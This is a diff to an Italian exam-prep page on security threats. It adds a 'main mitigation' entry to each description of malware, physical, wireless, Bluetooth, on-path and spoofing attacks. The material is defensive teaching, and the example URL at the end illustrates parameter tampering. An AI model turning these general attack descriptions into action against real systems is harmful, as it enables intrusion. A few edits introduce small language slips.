@@ -126,6 +126,8 @@
     <dd>Il modello operativo del crimine organizzato: il gruppo sviluppa il ransomware e lo affitta ad affiliati che si occupano della distribuzione, dividendo il riscatto. Ha democratizzato gli attacchi ransomware aumentandone il volume.</dd>
     <dt>Double extortion</dt>
     <dd>Tecnica moderna: l'attaccante non solo cifra i dati ma li esfil prima, minacciando di pubblicarli se il riscatto non viene pagato — anche se la vittima ripristina dal backup.</dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Esecuzione sistematica di backup scollegati fisicamente o in cloud non sovrascrivibile (air-gapped o immutable backup), limitazione dell'accesso in scrittura e isolamento tempestivo tramite agenti EDR dei comportamenti di crittografia di massa non approvati.</dd>
   </dl>
 
   <div class="exam-tip">
@@ -151,6 +153,9 @@
     da forum online che genera traffico outbound su porta non comune) descrive un Trojan
     con <strong>backdoor</strong> integrata.
   </p>
+  <p>
+    <strong>• Mitigazione principale:</strong> Attivazione del controllo delle applicazioni (Application Control / Whitelisting) per inibire l'avvio di file eseguibili non firmati digitalmente o provenienti da directory non autorizzate, requisire i privilegi minimi (Least Privilege) agli utenti finali per bloccare installazioni di programmi imprevisti, e ricorrere ad agenti antimalware EDR.
+  </p>
 
   <h3 id="worm">Worm</h3>
   <p>
@@ -166,6 +171,8 @@
     <dd>Traffico di rete elevato e anomalo su porte di servizi specifici (: TCP 445 = SMB, tipico di worm come WannaCry). Latenza di rete elevata. Sistemi che tentano di connettersi a molti altri host in sequenza. Nessun intervento utente rilevato prima dell'infezione.</dd>
     <dt>Vettori tipici</dt>
     <dd>Vulnerabilità nei servizi di rete esposti (SMB, RDP, SSH). Una volta entrato in un sistema, il worm scansiona automaticamente altri host raggiungibili e ripete il processo.</dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Rigida segmentazione della rete aziendale in VLAN isolate per bloccare i movimenti laterali automatici, disattivazione o limitazione dei protocolli e porte legacy non necessari (es. SMBv1, porta 445 se non indispensabile), e installazione automatizzata e proattiva delle patch di sicurezza sui servizi di rete.</dd>
   </dl>
 
   <div class="pitfall">
@@ -191,20 +198,22 @@
     <dd>Processo sconosciuto in esecuzione con permessi elevati. Traffico outbound verso IP sospetti con dati cifrati. Degradazione delle prestazioni. Logs di sistema che mostrano accesso a API di hook della tastiera.</dd>
     <dt>Indicatori keylogger hardware</dt>
     <dd>Dispositivo fisico tra il connettore della tastiera e la porta USB/PS2 del PC. Rilevabile solo con ispezione fisica del cablaggio.</dd>
+    <dt>Mitigazione principale</dt>
+    <dd>Uso di soluzioni anti-keylogger e agenti EDR per intercettare hook non autorizzati alle API delle chiamate di tastiera. Cifratura forzata di tutti i dati sensibili in transito, e adozione obbligatoria di MFA per impedire che le password carpite dal keylogger sblocchino gli account. Per i dispositivi hardware, esecuzione di ispezioni fisiche periodiche e sistematiche nel retro dei computer degli uffici aziendali.</dd>
   </dl>
 
   <h3 id="altri-malware">Virus · Bloatware · Rootkit · Beaconing</h3>
   <dl class="termlist">
     <dt>Virus</dt>
-    <dd>Malware che si replica infettando altri file eseguibili. Richiede che l'utente esegua il file infetto per attivarsi e propagarsi. Non si diffonde autonomamente sulla rete (a differenza del worm). Indicatore: hash di file eseguibili cambiato senza patch applicate.</dd>
+    <dd>Malware che si replica infettando altri file eseguibili. Richiede che l'utente esegua il file infetto per attivarsi e propagarsi. Non si diffonde autonomamente sulla rete (a differenza del worm). Indicatore: hash di file eseguibili cambiato senza patch applicate.<br><strong>• Mitigazione principale:</strong> Analisi di File Integrity Monitoring (FIM) per allertare istantaneamente su modifiche non autorizzate degli hash dei moduli del sistema operativo, integrate con antivirus con motori euristici capaci di rilevare file infettati.</dd>
     <dt>Bloatware</dt>
-    <dd>Software indesiderato pre-installato dai produttori (tipicamente su PC nuovi) o installato come bundle. Non sempre malevolo, ma consuma risorse, riduce le prestazioni e può introdurre vulnerabilità. L'indicatore è la presenza di applicazioni non richieste che si avviano automaticamente.</dd>
+    <dd>Software indesiderato pre-installato dai produttori (tipicamente su PC nuovi) o installato come bundle. Non sempre malevolo, ma consuma risorse, riduce le prestazioni e può introdurre vulnerabilità. L'indicatore è la presenza di applicazioni non richieste che si avviano automaticamente.<br><strong>• Mitigazione principale:</strong> Distribuzione sistematica di immagini standard prefabbricate e pulite (Gold Images) sui PC aziendali di nuova adozione, blocco dell'onboarding hardware non standard e policies attive di controllo software sui client.</dd>
     <dt>Rootkit</dt>
-    <dd>Malware progettato per nascondere la sua presenza e quella di altri malware al sistema operativo e ai tool di sicurezza. Modifica le API di sistema per restituire risultati alterati: se cerchi il processo malevolo, il rootkit lo nasconde dall'elenco dei processi. Indicatore classico: hash di file di sistema cambiato senza patch recenti (, : cmd.exe con hash modificato = rootkit). Può essere introdotto tramite side loading.</dd>
+    <dd>Malware progettato per nascondere la sua presenza e quella di altri malware al sistema operativo e ai tool di sicurezza. Modifica le API di sistema per restituire risultati alterati: se cerchi il processo malevolo, il rootkit lo nasconde dall'elenco dei processi. Indicatore classico: hash di file di sistema cambiato senza patch recenti (, : cmd.exe con hash modificato = rootkit). Può essere introdotto tramite side loading.<br><strong>• Mitigazione principale:</strong> Abilitazione rigorosa del Secure Boot UEFI per garantire l'avvio esclusivo di firmware e driver firmati e provvisti di chiavi crittografiche fidate, e utilizzo di agenti EDR integrati a livello kernel in grado di ispezionare le chiamate profonde di memoria.</dd>
     <dt>Fileless Malware (Malware senza file)</dt>
-    <dd>Un malware avanzato che non salva file eseguibili tradizionali sul disco rigido (hard drive), eludendo le scansioni degli antivirus tradizionali basati su firme. Opera iniettando il proprio codice malevolo direttamente nello spazio di memoria RAM di processi legittimi del sistema operativo (es. <code>PowerShell</code>, <code>WMI</code> o <code>cmd.exe</code>). Sfrutta strumenti integrati di amministrazione per svolgere le sue attività (Living-off-the-Land).</dd>
+    <dd>Un malware avanzato che non salva file eseguibili tradizionali sul disco rigido (hard drive), eludendo le scansioni degli antivirus tradizionali basati su firme. Opera iniettando il proprio codice malevolo direttamente nello spazio di memoria RAM di processi legittimi del sistema operativo (es. <code>PowerShell</code>, <code>WMI</code> o <code>cmd.exe</code>). Sfrutta strumenti integrati di amministrazione per svolgere le sue attività (Living-off-the-Land).<br><strong>• Mitigazione principale:</strong> Configurazione del Constrained Language Mode in PowerShell per limitare drasticamente le API richiamabili, abilitazione di log dettagliati dei blocchi di codice PowerShell (Script Block Logging) convogliati al SIEM, e adozione di agenti EDR avanzati per scansionare l'integrità della memoria RAM.</dd>
     <dt>Beaconing (Comunicazione a Beacon)</dt>
-    <dd>Il comportamento tipico di un malware installato che, ad intervalli regolari o randomizzati, effettua connessioni outbound (pings) verso il proprio server di <strong>Command and Control (C2)</strong> esterno dell'attaccante. Serve a segnalare che l'host è online ed infettato, ed a ricevere ed eseguire nuovi ordini o inviare dati catturati. La telemetria di rede evidenzia pattern costanti di traffico intermittente a intervalli fissi (es: ogni 10 secondi esatti) verso un medesimo IP non aziendale.</dd>
+    <dd>Il comportamento tipico di un malware installato che, ad intervalli regolari o randomizzati, effettua connessioni outbound (pings) verso il proprio server di <strong>Command and Control (C2)</strong> esterno dell'attaccante. Serve a segnalare che l'host è online ed infettato, ed a ricevere ed eseguire nuovi ordini o inviare dati catturati. La telemetria di rede evidenzia pattern costanti di traffico intermittente a intervalli fissi (es: ogni 10 secondi esatti) verso un medesimo IP non aziendale.<br><strong>• Mitigazione principale:</strong> Analisi del proxy e firewall aziendale per intercettare traffici a periodicità fissa (statistiche di ricorrenza), implementazione di DNS Sinkholing per reindirizzare le richieste verso i domini di comando noti dei criminali, e decifratura e ispezione SSL/TLS del traffico web in uscita.</dd>
   </dl>
 
   <div class="exam-tip">
@@ -224,6 +233,9 @@
     le condizioni non si verificano perché sembra codice legittimo. È tipicamente
     piantata da un <em>insider malevolo</em> — un dipendente scontento o in procinto
     di essere licenziato — che vuole colpire l'organizzazione dopo la sua partenza.
+  </p>
+  <p>
+    <strong>• Mitigazione principale:</strong> Implementazione rigorosa della separazione dei compiti (Separation of Duties), adozione di un modello di revisione bilaterale del codice sorgente e pianificazione delle pull request (Peer Review) per tutti gli script amministrativi, e auditing mirato e auditing dei log d'amministrazione in prossimità dell'onboarding e offboarding delle utenze privilegiate.
   </p>
 
   <div class="example-box">
@@ -249,6 +261,9 @@
     il brute force informatico (tentativi di password): il contesto è l'accesso fisico
     non autorizzato tramite forza diretta.
   </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Installazione di barriere fisiche rinforzate (porte blindate anti-scasso di classe elevata, infissi protetti, recinzioni metalliche dotate di sensori di vibrazione), impiego di guardie giurate per ronde fisiche e sorveglianza attiva, cablaggio di sensori volumetrici a infrarosso e sistemi CCTV di monitoraggio continuo con rilevamento automatico di intrusioni.
+  </p>
 
   <h3 id="rfid">RFID cloning (Clonazione RFID)</h3>
   <p>
@@ -264,6 +279,9 @@
     usato in più luoghi in un intervallo di tempo impossibile (<em>impossible travel</em>)
     o in rapida sequenza sullo stesso varco (: multiple entries from the same
     employee ID badge within a two-minute period).
+  </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Sostituzione dei badge legacy con carte RFID a crittografia avanzata (es. MIFARE DESFire EV3, iCLASS SE) resistenti alla clonazione tramite handshake crittografico mutuale, utilizzo obbligatorio di borsette o tessere protettive schermate (Faraday sleeves) per i dipendenti, e implementazione di un secondo fattore di autenticazione ai varchi delle aree critiche (biometria o tastierino PIN).
   </p>
 
   <div class="exam-tip">
@@ -284,6 +302,9 @@
     degli impianti di climatizzazione). Un data center senza sistemi di protezione
     ambientali adeguati (UPS, HVAC, sistema antincendio) è vulnerabile anche ad
     attacchi non informatici.
+  </p>
+  <p>
+    <strong>• Mitigazioni principali:</strong> Installazione di impianti HVAC ridondanti per il controllo termico e dell'umidità con sonde monitorate in tempo reale, implementazione di UPS con stabilizzatori di frequenza e alternatori d'emergenza diesel per interruzioni di corrente, posizionamento di sistemi di estinzione incendi a saturazione di gas pulito (es. FM200) e sensori di allagamento sotto il pavimento galleggiante.
   </p>
 </section>
 
@@ -441,32 +462,32 @@
   <h3 id="wireless">Wireless attacks (Attacchi wireless)</h3>
   <dl class="termlist">
     <dt>Evil twin (Access point gemello malevolo)</dt>
-    <dd>Un attaccante crea un access point Wi-Fi con lo stesso SSID e caratteristiche di un AP legittimo. Gli utenti si connettono al falso AP credendolo legittimo. L'attaccante vede tutto il traffico non cifrato e può iniettare contenuti malevoli.</dd>
+    <dd>Un attaccante crea un access point Wi-Fi con lo stesso SSID e caratteristiche di un AP legittimo. Gli utenti si connettono al falso AP credendolo legittimo. L'attaccante vede tutto il traffico non cifrato e può iniettare contenuti malevoli.<br><strong>• Mitigazione principale:</strong> Uso dello standard WPA3-Enterprise con protocollo EAP-TLS che convalida in modo mutuale l'identità dell'access point tramite certificati crittografici digitali emessi dalla CA interna aziendale, rifiutando la connessione in caso di certificato mancante o non valido, e l'impiego perenne di VPN aziendali.</dd>
     <dt>Deauthentication attack</dt>
-    <dd>L'attaccante invia frame di deauthentication falsificati per disconnettere i client dall'AP legittimo, forzandoli a riconnettersi (possibilmente all'evil twin) o per catturare l'handshake WPA2 durante la riconnessione (per attacchi offline alla password).</dd>
+    <dd>L'attaccante invia frame di deauthentication falsificati per disconnettere i client dall'AP legittimo, forzandoli a riconnettersi (possibilmente all'evil twin) o per catturare l'handshake WPA2 durante la riconnessione (per attacchi offline alla password).<br><strong>• Mitigazione principale:</strong> Abilitazione obbligatoria dello standard di sicurezza Wi-Fi <strong>802.11w PMF (Protected Management Frames)</strong>, che firma crittograficamente i pacchetti di controllo e gestione (tra cui le disconnessioni), impedendo ad estranei sul canale di falsificarli.</dd>
     <dt>Jamming</dt>
-    <dd>Interferenza radio che rende inutilizzabile il canale wireless. Indicatore: degradazione o interruzione del segnale Wi-Fi in un'area specifica senza causa tecnica apparente.</dd>
+    <dd>Interferenza radio che rende inutilizzabile il canale wireless. Indicatore: degradazione o interruzione del segnale Wi-Fi in un'area specifica senza causa tecnica apparente.<br><strong>• Mitigazione principale:</strong> Installazione di sensori WIPS (Wireless Intrusion Prevention System) operanti in spettro continuo per triangolare ed individuare l'origine geografica di rumori ed interferenze nocive artificiali sul canale RF, e forzatura temporanea di routing dinamici su frequenze o canali meno compromessi.</dd>
     
     <dt>Insecure Pairing (Accoppiamento Non Sicuro)</dt>
-    <dd>Vulnerabilità o impostazione debole riscontrabile quando due periferiche Bluetooth completano il processo di accoppiamento (pairing) senza applicare crittografia robusta o meccanismi di autenticazione mutua (es. Just Works). Permette a intercettatori adiacenti di decodificare il traffico in chiaro o inserire un dispositivo malevolo nella catena di trust logica.</dd>
+    <dd>Vulnerabilità o impostazione debole riscontrabile quando due periferiche Bluetooth completano il processo di accoppiamento (pairing) senza applicare crittografia robusta o meccanismi di autenticazione mutua (es. Just Works). Permette a intercettatori adiacenti di decodificare il traffico in chiaro o inserire un dispositivo malevolo nella catena di trust logica.<br><strong>• Mitigazione principale:</strong> Forzatura dei soli modelli di accoppiamento che richiedono un PIN o una passkey univoca e casuale (es. Secure Simple Pairing con Numeric Comparison), vietando l'uso di standard di accoppiamento non autenticati e vulnerabili in chiaro.</dd>
 
     <dt>Device Spoofing (Falsificazione del Dispositivo)</dt>
-    <dd>Attacco mirato in cui l'attaccante falsifica le credenziali fisiche o identificatori di rete di un dispositivo legittimo (es. spoofing di MAC address Bluetooth o UUID di card RFID ed endpoint fidi). Consente di aggirare gli elenchi di controllo d'accesso (ACL) della rete fidata o costringere un host ad accoppiarsi al nodo malevolo simulato.</dd>
+    <dd>Attacco mirato in cui l'attaccante falsifica le credenziali fisiche o identificatori di rete di un dispositivo legittimo (es. spoofing di MAC address Bluetooth o UUID di card RFID ed endpoint fidi). Consente di aggirare gli elenchi di controllo d'accesso (ACL) della rete fidata o costringere un host ad accoppiarsi al nodo malevolo simulato.<br><strong>• Mitigazione principale:</strong> Adozione di soluzioni di autenticazione forte e crittografia bilaterale a livello delle applicazioni, affinché l'accesso non si basi unicamente su attributi di rete facilmente falsificabili come l'indirizzo MAC.</dd>
 
     <dt>Bluejacking (Spam via Bluetooth)</dt>
-    <dd>Pratica fastidiosa che consiste nell'invio di messaggi non richiesti, contatti commerciali o note di spam tramite Bluetooth a dispositivi mobili adiacenti configurati in modalità visibile/scopribile. Pur non compromettendo l'integrità dei dati o i file memorizzati, rappresenta un fastidio visivo.</dd>
+    <dd>Pratica fastidiosa che consiste nell'invio di messaggi non richiesti, contatti commerciali o note di spam tramite Bluetooth a dispositivi mobili adiacenti configurati in modalità visibile/scopribile. Pur non compromettendo l'integrità dei dati o i file memorizzati, rappresenta un fastidio visivo.<br><strong>• Mitigazione principale:</strong> Impostazione permanente delle antenne Bluetooth in modalità non scopribile (Non-Discoverable) e spegnimento completo dell'interfaccia radio quando non è attivamente utilizzata.</dd>
 
     <dt>Bluesnarfing (Furto Dati via Bluetooth)</dt>
-    <dd>Gravissimo attacco wireless a corto raggio mirato a stabilire una connessione non autorizzata verso un dispositivo Bluetooth vittima per sottrarne silenziosamente informazioni private, tra cui messaggi SMS, cache delle email, rubrica telefonica, foto e file personali memorizzati, senza il consenso o l'invito della vittima.</dd>
+    <dd>Gravissimo attacco wireless a corto raggio mirato a stabilire una connessione non autorizzata verso un dispositivo Bluetooth vittima per sottrarne silenziosamente informazioni private, tra cui messaggi SMS, cache delle email, rubrica telefonica, foto e file personali memorizzati, senza il consenso o l'invito della vittima.<br><strong>• Mitigazione principale:</strong> Mantenimento dello stato invisibile del dispositivo, spegnimento preventivo del servizio radio in zone ad alta affluenza sconosciute, e installazione rigorosa di aggiornamenti e patch di sicurezza dell'OS.</dd>
 
     <dt>Bluebugging (Controllo Remoto via Bluetooth)</dt>
-    <dd>Attacco estremamente intrusivo che sfrutta vulnerabilità Bluetooth per prendere il controllo logico quasi totale del dispositivo mobile bersaglio. Permette all'attaccante di effettuare chiamate telefoniche, spedire messaggi di testo a monte, intercettare le telefonate attive, ed attivare segretamente il microfono o la fotocamera per spionaggio ambientale.</dd>
+    <dd>Attacco estremamente intrusivo che sfrutta vulnerabilità Bluetooth per prendere il controllo logico quasi totale del dispositivo mobile bersaglio. Permette all'attaccante di effettuare chiamate telefoniche, spedire messaggi di testo a monte, intercettare le telefonate attive, ed attivare segretamente il microfono o la fotocamera per spionaggio ambientale.<br><strong>• Mitigazione principale:</strong> Revoca incondizionata di qualsiasi richiesta di accoppiamento spontanea proveniente dall'esterno, unita all'immediata applicazione degli update di sicurezza del sistema operativo forniti dai produttori.</dd>
 
     <dt>Bluesmack (DoS via Bluetooth)</dt>
-    <dd>Attacco di tipo Denial of Service (DoS) contro la radio Bluetooth di un dispositivo. Si realizza inviando pacchetti L2CAP distorti o di dimensioni spropositate (equivalente wireless del classico attacco e-mail o Ping of Death), forzando il buffer della vittima a saturarsi e provocandone il crash o il congelamento hardware istantaneo.</dd>
+    <dd>Attacco di tipo Denial of Service (DoS) contro la radio Bluetooth di un dispositivo. Si realizza inviando pacchetti L2CAP distorti o di dimensioni spropositate (equivalente wireless del classico attacco e-mail o Ping of Death), forzando il buffer della vittima a saturarsi e provocandone il crash o il congelamento hardware istantaneo.<br><strong>• Mitigazione principale:</strong> Aggiornamento sistematico del firmware dell'antenna e dei relativi driver di controllo per impedire buffer overflow legati all'elaborazione di pacchetti wireless di dimensioni anomale o deformati.</dd>
 
     <dt>Blueborne (Vulnerabilità dello Stack Bluetooth)</dt>
-    <dd>Famiglia devastante di vulnerabilità logiche situate a basso livello all'interno dei driver dello stack Bluetooth di molteplici sistemi operativi (Android, iOS, Windows, Linux). Permette ad un attaccante vicino di eseguire codice arbitrario da remoto (RCE) e diffondere malware a catena nell'ambiente circostante a prescindere dal pairing preventivo o che il terminale sia impostato in modalità non visibile.</dd>
+    <dd>Famiglia devastante di vulnerabilità logiche situate a basso livello all'interno dei driver dello stack Bluetooth di molteplici sistemi operativi (Android, iOS, Windows, Linux). Permette ad un attaccante vicino di eseguire codice arbitrario da remoto (RCE) e diffondere malware a catena nell'ambiente circostante a prescindere dal pairing preventivo o che il terminale sia impostato in modalità non visibile.<br><strong>• Mitigazione principale:</strong> Spegnimento immediato del servizio Bluetooth se non necessario, e installazione repentina dei bollettini software mensili di sicurezza rilasciati dal vendor del sistema operativo.</dd>
   </dl>
 
   <h4 style="margin-top: 24px; color: var(--navy); font-weight: 700;">Linee Guida e Mitigazioni del Rischio Bluetooth</h4>
@@ -477,7 +498,7 @@
     <li><strong>Aggiornamenti regolari del dispositivo (Regularly updating devices)</strong>: Installare costantemente le patch di sicurezza ufficiali per sanare bachi ed exploit di fabbrica legati al driver di comunicazione (es. contromisure a Blueborne).</li>
     <li><strong>Accoppiamento esclusivo con nodi attendibili (Only pairing with known & trusted devices)</strong>: Avviare e completare il pairing solo con accessori di chiara proprietà e di fonti certificate, bloccando preventivamente periferiche adiacenti non autorizzate.</li>
     <li><strong>Utilizzare sempre PIN e Passkey univoci (Always using unique PINs or passkeys)</strong>: Evitare assoluta l'uso di codici PIN predefiniti standard (es. "0000" o "1234") durante la fase di accoppiamento. Imporre PIN complessi, casuali e unici per inibire tecniche di cracking radio.</li>
-    <li><strong>Diffidare di richieste di accoppiamento improvvise (Cautious of unsolicited connection requests)</strong>: Sviluppare consapevolezza nel personale (Security Awareness) affinché ignori o neghi sdegnosamente qualsiasi pop-up pop-up improvviso o inatteso di richiesta di connessione o accostamento Bluetooth.</li>
+    <li><strong>Diffidare di richieste di accoppiamento improvvise (Cautious of unsolicited connection requests)</strong>: Sviluppare consapevolezza nel personale (Security Awareness) affinché ignori o neghi sdegnosamente qualsiasi pop-up improvviso o inatteso di richiesta di connessione o accostamento Bluetooth.</li>
     <li><strong>Impiegare la crittografia per i trasferimenti sensibili (Using encryption for sensitive data transfers)</strong>: Anche in caso di accoppiamento Bluetooth attivo, assicurarsi che lo scambio di dati strategici o confidenziali sia incapsulato in canali cifrati a livello superiore (es. crittografia end-to-end proprietaria o applicazioni conformi con autenticazione forte), scongiurando intercettazioni on-path se le chiavi del Bluetooth venissero violate.</li>
   </ul>
 
@@ -493,27 +514,27 @@
   <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
     <dt>ARP Poisoning (o ARP Spoofing)</dt>
     <dd>
-      Avviene a livello locale (LAN — Layer 2 del modello ISO/OSI). L'attaccante invia pacchetti ARP fasulli e non richiesti (Gratuitous ARP replies) alla vittima e al gateway di rete (router). In questi pacchetti, l'attaccante associa il proprio indirizzo fisico (MAC address) all'indirizzo IP del gateway legittimo (e viceversa). Le tabelle dei dispositivi (la ARP cache) ne vengono "avvelenate": da quel momento, tutto il traffico locale originato dalla vittima e destinato a Internet transiterà attraverso la scheda di rete dell'attaccante prima di essere inoltrato al gateway.
+      Avviene a livello locale (LAN — Layer 2 del modello ISO/OSI). L'attaccante invia pacchetti ARP fasulli e non richiesti (Gratuitous ARP replies) alla vittima e al gateway di rete (router). In questi pacchetti, l'attaccante associa il proprio indirizzo fisico (MAC address) all'indirizzo IP del gateway legittimo (e viceversa). Le tabelle dei dispositivi (the ARP cache) ne vengono "avvelenate": da quel momento, tutto il traffico locale originato dalla vittima e destinato a Internet transiterà attraverso la scheda di rete dell'attaccante prima di essere inoltrato al gateway.<br><strong>• Mitigazione principale:</strong> Configurazione di <strong>Dynamic ARP Inspection (DAI)</strong> sugli switch di rete combinata con <strong>DHCP Snooping</strong> per convalidare l'autenticità dei pacchetti ARP prima del transito orizzontale.
     </dd>
 
     <dt>DNS Poisoning (o DNS Spoofing)</dt>
     <dd>
-      L'attaccante inietta record di indirizzi contraffatti (es. record A o CNAME) nella memoria cache di un DNS resolver o di un server dei nomi. Quando il client tenta di navigare su un sito ufficiale (es. <code>banca-sicura.com</code>), la risoluzione dei nomi associa erroneamente quel dominio IP all'indirizzo dei server controllati dall'hacker. Il browser della vittima si collega così al finto server in modalità del tutto trasparente per l'utente, stabilendo una sessione intermediata dall'attaccante.
+      L'attaccante inietta record di indirizzi contraffatti (es. record A o CNAME) nella memoria cache di un DNS resolver o di un server dei nomi. Quando il client tenta di navigare su un sito ufficiale (es. <code>banca-sicura.com</code>), la risoluzione dei nomi associa erroneamente quel dominio IP all'indirizzo dei server controllati dall'hacker. Il browser della vittima si collega così al finto server in modalità del tutto trasparente per l'utente, stabilendo una sessione intermediata dall'attaccante.<br><strong>• Mitigazione principale:</strong> Implementazione di <strong>DNSSEC</strong> (DNS Security Extensions) a tutti i livelli dell'infrastruttura per garantire l'origine e l'integrità del traffico DNS tramite firme asimmetriche.
     </dd>
 
     <dt>Rogue Wireless Access Point (Rogue WAP) e Evil Twin</dt>
     <dd>
-      Un vettore di tipo aereo (Layer 1 e 2 Wireless). Un <strong>Rogue Access Point (WAP Silente)</strong> è un punto d'accesso Wi-Fi non autorizzato collegato fisicamente alla rete dell'azienda. L'attaccante può configurarlo anche come un <strong>Evil Twin</strong>: una finta antenna Wi-Fi configurata con lo stesso identico nome (SSID) e canali radio di una rete fidata o aziendale esistente. I dispositivi mobili dei dipendenti si collegano automaticamente al WAP pirata credendolo l'hotspot legittimo; l'attore malevolo, gestendo la finta antenna, incanala e controlla sul proprio gateway l'intero traffico internet degli ospiti connessi.
+      Un vettore di tipo aereo (Layer 1 e 2 Wireless). Un <strong>Rogue Access Point (WAP Silente)</strong> è un punto d'accesso Wi-Fi non autorizzato collegato fisicamente alla rete dell'azienda. L'attaccante può configurarlo anche come un <strong>Evil Twin</strong>: una finta antenna Wi-Fi configurata con lo stesso identico nome (SSID) e canali radio di una rete fidata o aziendale esistente. I dispositivi mobili dei dipendenti si collegano automaticamente al WAP pirata credendolo l'hotspot legittimo; l'attore malevolo, gestendo la finta antenna, incanala e controlla sul proprio gateway l'intero traffico internet degli ospiti connessi.<br><strong>• Mitigazione principale:</strong> Impiego di <strong>802.1X Wired Authentication</strong> per negare l'accesso alle porte ethernet aziendali a dispositivi Wi-Fi non approvati, integrato con soluzioni WIPS (Wireless Intrusion Prevention System) per rilevare continuativamente la presenza di antenne non aziendali confinanti.
     </dd>
 
     <dt>Rogue Hub / Switch</dt>
     <dd>
-      Un'intrusione fisica. L'attore malevolo inserisce abusivamente una periferica concentratrice (un vecchio <strong>Hub</strong>, che per natura diffonde in broadcast ogni pacchetto di rete a tutte le sue porte, o uno <strong>Switch</strong> abusivamente pre-configurato per effettuare MAC Flooding o abilitare il Port Mirroring su un socket) in mezzo a un collegamento cablato legittimo (es. tra una presa a muro e un computer d'ufficio). Questo dispositivo ausiliario sdoppia e convoglia i frame verso un computer di sniffing presidiato dall'attaccante, permettendogli la cattura del traffico in chiaro.
+      Un'intrusione fisica. L'attore malevolo inserisce abusivamente una periferica concentratrice (un vecchio <strong>Hub</strong>, che per natura diffonde in broadcast ogni pacchetto di rete a tutte le sue porte, o uno <strong>Switch</strong> abusivamente pre-configurato per effettuare MAC Flooding o abilitare il Port Mirroring su un socket) in mezzo a un collegamento cablato legittimo (es. tra una presa a muro e un computer d'ufficio). Questo dispositivo ausiliario sdoppia e convoglia i frame verso un computer di sniffing presidiato dall'attaccante, permettendogli la cattura del traffico in chiaro.<br><strong>• Mitigazione principale:</strong> Abilitazione di politiche rigide di <strong>Port Security (Port Security limits)</strong> sugli switch fisici impostando un MAC limit restrittivo (massimo 1 MAC address per singola porta fisica) ed un'azione automatica di blocco/shutdown della porta stessa nel caso in cui un secondo indirizzo MAC (quello dell'Hub/Switch estraneo) venga rilevato.
     </dd>
 
     <dt>Snooping (o Sniffing / Eavesdropping)</dt>
     <dd>
-      A differenza degli attacchi on-path attivi che manipolano e alterano la rete o i protocolli, lo <strong>snooping</strong> rappresenta la pura intercettazione passiva e silenziosa del traffico di transito (es. tramite un packet sniffer in modalità promiscua). L'attaccante raccoglie passivamente dati sensibili (password in chiaro, email, chat) senza modificare in alcun modo le trame dati, il che rende l'attacco invisibile ai tipici sistemi di monitoraggio della disponibilità.
+      A differenza degli attacchi on-path attivi che manipolano e alterano la rete o i protocolli, lo <strong>snooping</strong> rappresenta la pura intercettazione passiva e silenziosa del traffico di transito (es. tramite un packet sniffer in modalità promiscua). L'attaccante raccoglie passivamente dati sensibili (password in chiaro, email, chat) senza modificare in alcun modo le trame dati, il che rende l'attacco invisibile ai tipici sistemi di monitoraggio della disponibilità.<br><strong>• Mitigazione principale:</strong> Cifratura completa ed universale a livello applicazione dell'intero traffico in transito (SSH, HTTPS/TLS, IPsec) per rendere i frame catturati del tout court illegibili allo sniffing, ed inibizione strutturale del traffico wireless tramite port isolation.
     </dd>
   </dl>
 
@@ -553,16 +574,16 @@
   </p>
   <dl class="termlist" style="margin-left: 10px; margin-bottom: 24px;">
     <dt>IP Spoofing</dt>
-    <dd>Consiste nel falsificare l'intestazione dell'indirizzo IP di sorgente all'interno dei pacchetti IP trasmessi. È la base degli attacchi DoS/DDoS riflessi o di bypass dei firewall basati esclusivamente su policy di IP-trusting.</dd>
+    <dd>Consiste nel falsificare l'intestazione dell'indirizzo IP di sorgente all'interno dei pacchetti IP trasmessi. È la base degli attacchi DoS/DDoS riflessi o di bypass dei firewall basati esclusivamente su policy di IP-trusting.<br><strong>• Mitigazione principale:</strong> Attivazione del filtraggio <strong>BCP 38 (Ingress/Egress Filtering)</strong> sui router di perimetro per scartare pacchetti in uscita che mostrano indirizzi IP sorgente incoerenti con la rete d'origine, ed adozione di IPSec.</dd>
 
     <dt>MAC Spoofing</dt>
-    <dd>Consiste nel reimpostare manualmente l'indirizzo fisico unico della scheda di rete (MAC address) per impersonare un host autorizzato o per aggirare i controlli dinamici di MAC filtering applicati sugli switch o sulle porte Wi-Fi aziendali.</dd>
+    <dd>Consiste nel reimpostare manualmente l'indirizzo fisico unico della scheda di rete (MAC address) per impersonare un host autorizzato o per aggirare i controles dinamici di MAC filtering applicati sugli switch o sulle porte Wi-Fi aziendali.<br><strong>• Mitigazione principale:</strong> Abilitazione di <strong>Port Security</strong> sugli interruttori LAN (switch) per porre limiti rigidi e vincolanti agli indirizzi MAC accettati per singola porta fisica, abbinata all'adozione del protocollo di autenticazione <strong>802.1X</strong>.</dd>
 
     <dt>DNS Spoofing (o DNS Poisoning)</dt>
-    <dd>La corruzione deliberata delle corrispondenze IP-Dominio all'interno della memoria cache del server DNS per deviare in modo invisibile ed automatico i client verso portali contraffatti (phishing) controllati dall'aggressore.</dd>
+    <dd>La corruzione deliberata delle corrispondenze IP-Dominio all'interno della memoria cache del server DNS per deviare in modo invisibile ed automatico i client verso portali contraffatti (phishing) controllati dall'aggressore.<br><strong>• Mitigazione principale:</strong> Configurazione universale del protocollo <strong>DNSSEC</strong> per firmare crittograficamente i record di zona sul server autoritativo e renderli immuni da manipolazioni.</dd>
 
     <dt>Caller ID Spoofing</dt>
-    <dd>La falsificazione visiva del numero telefonico chiamante (es: simulando il centralino dell'assistenza bancaria) in ambito VoIP, adoperata per indurre in inganno l'utente durante campagne di truffa vocale (Vishing).</dd>
+    <dd>La falsificazione visiva del numero telefonico chiamante (es: simulando il centralino dell'assistenza bancaria) in ambito VoIP, adoperata per indurre in inganno l'utente durante campagne di truffa vocale (Vishing).<br><strong>• Mitigazione principale:</strong> Adozione ed enforcing degli standard crittografici di attestazione <strong>STIR/SHAKEN</strong> da parte dei carrier telefonici per autenticare digitalmente la legittimità delle chiamate in ingresso.</dd>
   </dl>
 
   <h3 id="cred-replay">Replay Attack (Attacco di Replay) e Credential Replay</h3>
@@ -715,6 +736,8 @@
       <br><code>https://banca.it/estratto_conto.php?account_id=7410</code>
